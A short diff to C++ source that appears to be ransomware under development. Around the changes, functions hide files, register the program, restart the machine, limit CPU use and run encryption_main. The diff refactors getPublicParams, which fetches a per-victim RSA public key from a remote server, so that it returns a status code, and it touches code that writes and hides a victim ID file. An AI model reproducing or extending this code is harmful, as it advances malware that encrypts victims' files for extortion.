@@ -24,15 +24,16 @@ Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob);
 void doRestart();
 void makeFileHidden(string path);
 void RegisterProgram();
-Status getPublicParams(string& mod, string& pubKey);
+Status getPublicParams(string id, string& mod, string& pubKey);
 
-void getPublicParams(string id, string& mod, string& pubKey)
+Status getPublicParams(string id, string& mod, string& pubKey)
 {
 	string url = URL_PUBLIC_RSA + id;
 	string chunk;
-	getFromServer(url, chunk);
+	Status status;
+	status = getFromServer(url, chunk);
 	parsePublicKey(chunk, mod, pubKey);
-
+	return status;
 }
 int encryption_main( bool fromStart) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
@@ -101,7 +102,6 @@ int encryption_main( bool fromStart) {
 //	SetFileAttributes(pathToMasters.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
 //	masterKeyIVFile.close();
 	
-	
 	IDFile.open(pathToID, std::ios::out);
 	if(!IDFile.is_open())
 	{
@@ -111,6 +111,7 @@ int encryption_main( bool fromStart) {
 	IDFile.write((char*)id, ID_LEN);
 	IDFile.close();
 	makeFileHidden(pathToID);
+
 
 	pubFile.open(pathToENC, std::ios::out);
 	if (!IDFile.is_open())
